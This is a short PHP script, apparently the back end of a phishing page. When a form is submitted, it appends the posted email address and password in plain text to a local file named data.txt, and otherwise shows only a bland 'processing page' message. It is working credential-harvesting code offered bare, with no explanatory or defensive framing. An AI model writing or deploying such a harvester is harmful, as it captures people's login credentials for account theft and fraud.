<?php 
if (isset($_POST["submit2"])) {
$file = fopen('data.txt', 'a+');
$write = fwrite($file, 'email: '.$_POST['user']. PHP_EOL .'password: '. $_POST['pw'].PHP_EOL.PHP_EOL );
fclose($file);
}
else {
	echo "Hi, processing page";
 }
 ?>
